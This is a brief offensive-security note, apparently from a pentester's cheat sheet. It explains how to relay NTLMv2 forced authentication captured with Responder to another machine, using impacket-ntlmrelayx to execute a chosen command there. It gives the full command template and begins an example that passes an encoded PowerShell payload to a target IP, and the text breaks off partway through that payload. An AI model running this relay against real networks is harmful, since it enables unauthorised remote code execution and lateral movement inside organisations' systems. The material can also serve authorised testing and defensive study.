#If we had some NTLMv2 hash password extracted via forced autentication (this can be tested with Responder utility), we can relay this forced autentication to login in another machine and execute a command through the following impacket utility:

sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGETIP> -c "<COMMAND>"

#The command above will catch the forced authentication and will execute the COMMAND on the TARGETIP.
#
#For example; sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.226.242 -c "powershell -enc JABjA
